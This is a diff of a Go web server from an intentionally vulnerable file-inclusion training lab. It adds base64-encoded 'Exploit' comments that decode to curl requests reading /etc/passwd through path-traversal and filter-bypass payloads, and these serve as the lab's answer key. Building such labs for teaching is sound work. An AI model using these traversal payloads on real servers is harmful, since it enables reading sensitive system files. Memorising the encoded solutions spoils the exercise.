@@ -11,6 +11,7 @@ import (
 
 const baseDir = "/home/user/git/vulnerable-labs/golang_lfi/files"
 
+// Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzA/ZmlsZT0vZXRjL3Bhc3N3ZCI=
 func handleGetFile0(w http.ResponseWriter, r *http.Request) {
     file := r.URL.Query().Get("file")
     if file == "" {
@@ -31,6 +32,7 @@ func handleGetFile0(w http.ResponseWriter, r *http.Request) {
     }
 }
 
+// Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzE/ZmlsZT0uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkIg==
 func handleGetFile1(w http.ResponseWriter, r *http.Request) {
     file := r.URL.Query().Get("file")
     if file == "" {
@@ -56,6 +58,7 @@ func handleGetFile1(w http.ResponseWriter, r *http.Request) {
     }
 }
 
+// Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzI/ZmlsZT0uLi4vLi8uLi4vLi8uLi4vLi8uLi4vLi8uLi4vLi9ldGMvcGFzc3dkIgo=
 func handleGetFile2(w http.ResponseWriter, r *http.Request) {
     file := r.URL.Query().Get("file")
     if file == "" {
@@ -84,6 +87,7 @@ func handleGetFile2(w http.ResponseWriter, r *http.Request) {
     }
 }
 
+// Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzM/ZmlsZT1iYWQudHh0Ig==
 func handleGetFile3(w http.ResponseWriter, r *http.Request) {
     file := r.URL.Query().Get("file")
     if file == "" {
@@ -116,6 +120,7 @@ func handleGetFile3(w http.ResponseWriter, r *http.Request) {
     }
 }
 
+// Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzQ/ZmlsZT0vZXRjL3Bhc3N3ZC5wZGYi
 func handleGetFile4(w http.ResponseWriter, r *http.Request) {
     file := r.URL.Query().Get("file")
     if file == "" {
@@ -154,6 +159,7 @@ func handleGetFile4(w http.ResponseWriter, r *http.Request) {
     }
 }
 
+// Example: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzU/ZmlsZT0vZXRjL3Bhc3N3ZC5wZGYi
 func handleGetFile5(w http.ResponseWriter, r *http.Request) {
     file := r.URL.Query().Get("file")
     if file == "" {
@@ -193,16 +199,17 @@ func handleGetFile5(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
-    // Solution: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzA/ZmlsZT0vZXRjL3Bhc3N3ZCI=
+    // Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzA/ZmlsZT0vZXRjL3Bhc3N3ZCI=
     http.HandleFunc("/0", handleGetFile0)
-    // Solution: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzE/ZmlsZT0uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkIg==
+    // Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzE/ZmlsZT0uLi8uLi8uLi8uLi8uLi9ldGMvcGFzc3dkIg==
     http.HandleFunc("/1", handleGetFile1)
-    // Solution: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzI/ZmlsZT0uLi4vLi8uLi4vLi8uLi4vLi8uLi4vLi8uLi4vLi9ldGMvcGFzc3dkIgo=
+    // Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzI/ZmlsZT0uLi4vLi8uLi4vLi8uLi4vLi8uLi4vLi8uLi4vLi9ldGMvcGFzc3dkIgo=
     http.HandleFunc("/2", handleGetFile2)
-    // Solution: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzM/ZmlsZT1iYWQudHh0Ig==
+    // Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzM/ZmlsZT1iYWQudHh0Ig==
     http.HandleFunc("/3", handleGetFile3)
-    // Solution: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzQ/ZmlsZT0vZXRjL3Bhc3N3ZC5wZGYi
+    // Exploit: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzQ/ZmlsZT0vZXRjL3Bhc3N3ZC5wZGYi
     http.HandleFunc("/4", handleGetFile4)
+    // Example: Y3VybCAiaHR0cDovL2xvY2FsaG9zdDo4MDgwLzU/ZmlsZT0vZXRjL3Bhc3N3ZC5wZGYi
     http.HandleFunc("/5", handleGetFile5)
 
     fmt.Println("Starting server on http://localhost:8080")
